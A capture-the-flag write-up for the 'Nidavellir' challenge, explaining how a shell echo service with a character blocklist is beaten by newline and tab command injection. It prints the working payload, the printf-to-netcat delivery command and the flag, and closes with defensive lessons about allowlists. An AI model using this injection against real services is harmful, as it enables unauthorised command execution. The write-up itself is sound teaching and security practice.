# Nidavellir (400 pts - MISC)

## Challenge Description

> Long ago in Nidavellir, where molten rivers fuel the dwarven forges, the craftsmen built a strange device for Thor himself. It was meant to test cunning rather than strength — an ancient terminal called the Echo Forge. The rules are simple and deceptive. Whatever command a traveller enters is immediately echoed back, unaltered and unfiltered, by the ancient mechanism.

**Difficulty:** Medium

> **Note:** This challenge is a repeat of [Nidavellir from PerfectRoot CTF 2025](../../PerfectRoot-2025/Nidavellir/README.md). The challenge was deployed verbatim on the AfricaHackon Dojo platform and the original solution applied unchanged.

## TL;DR

Command injection via newline characters with tab-separated arguments, bypassing a character blocklist to execute arbitrary shell commands.

## Initial Analysis

Connecting to the service returned a Python script (`script.py`) showing:
- Input sanitization blocklist: `space`, `>`, `` ` ``, `;`, `{`, `/`, `&`, `|`, `"`, `$`
- User input inserted into: `echo {user_input}`
- Commands executed via `/bin/sh`

**Key Insight:** Newlines (`\n`) and tabs (`\t`) were NOT blocked.

## Solution

### Step 1: Identify the Vulnerability

The blocklist caught every common injection character but missed whitespace alternatives. A newline in the input terminates the `echo` command and starts a new shell command; a tab substitutes for a space in shell argument separation.

### Step 2: Craft the Payload

```python
payload = "dummy\ncd\t..\ncd\t..\ncd\t..\ncat\tflag.txt"
```

This executes:

```bash
echo dummy
cd  ..      # /usr/src/app → /usr/src
cd  ..      # /usr/src → /usr
cd  ..      # /usr → /
cat flag.txt
```

### Step 3: Execute

```bash
printf 'dummy\ncd\t..\ncd\t..\ncd\t..\ncat\tflag.txt\n' | nc <host> <port>
```

## Flag

```
r00t{wh15p3r5_0f_7h3_3ch0_4rg3_2b26a1c7}
```

## Key Takeaways

- **Blocklists are fragile** — missing a single bypass character (here, newline) defeats the entire sanitization scheme.
- **Whitespace alternatives** — tabs work as argument separators in most shells, and are frequently overlooked in blocklists designed to catch spaces.
- **Defense:** Use an allowlist instead of a blocklist, quote shell variables properly, or eliminate shell execution entirely in favour of safe APIs.

## Tools Used

- `nc` (netcat)
- `printf` — payload delivery with escape sequences
